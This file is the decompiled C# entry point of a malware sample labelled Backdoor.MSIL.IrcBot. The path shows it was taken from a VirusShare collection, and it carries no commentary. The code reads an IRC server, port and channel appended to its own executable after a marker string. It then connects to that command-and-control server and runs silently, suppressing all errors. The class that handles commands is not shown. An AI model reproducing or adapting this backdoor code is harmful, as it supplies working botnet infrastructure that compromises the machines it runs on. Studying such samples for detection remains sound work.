// Decompiled with JetBrains decompiler
// Type: AppClient.Program
// Assembly: AppClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 40D3B218-45AF-4713-B3C6-786D65AE1018
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00008-msil\Backdoor.MSIL.IrcBot.qe-710c3e02ba2956aa9af7f425e418218917e2c44f55f619222b605ff80f0dd9b9.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace AppClient
{
  [StandardModule]
  public sealed class Program
  {
    public const string Value = "JgtZ8TwC";

    private static string[] SplitString(string Chaine, string Separateur)
    {
      Chaine += Separateur;
      List<string> stringList = new List<string>();
      for (int startIndex1 = 0; Chaine.IndexOf(Separateur, startIndex1) > -1; startIndex1 = checked (Chaine.IndexOf(Separateur, startIndex1) + 1))
      {
        int startIndex2 = startIndex1 == 0 ? startIndex1 : checked (startIndex1 + Separateur.Length - 1);
        int num = Chaine.IndexOf(Separateur, startIndex1);
        stringList.Add(Chaine.Substring(startIndex2, checked (num - startIndex2)));
      }
      return stringList.ToArray();
    }

    [STAThread]
    public static void Main()
    {
      try
      {
        string[] strArray = Program.SplitString(File.ReadAllText(Application.ExecutablePath), "JgtZ8TwC");
        if (strArray.Length > 1)
        {
          Connexion.IRCServer = strArray[1];
          Connexion.IRCPort = Conversions.ToInteger(strArray[2]);
          Connexion.Canal = strArray[3];
        }
        Connexion.eConnexion.Connect(Connexion.IRCServer, Connexion.IRCPort);
        while (true)
        {
          Thread.Sleep(10);
          Application.DoEvents();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
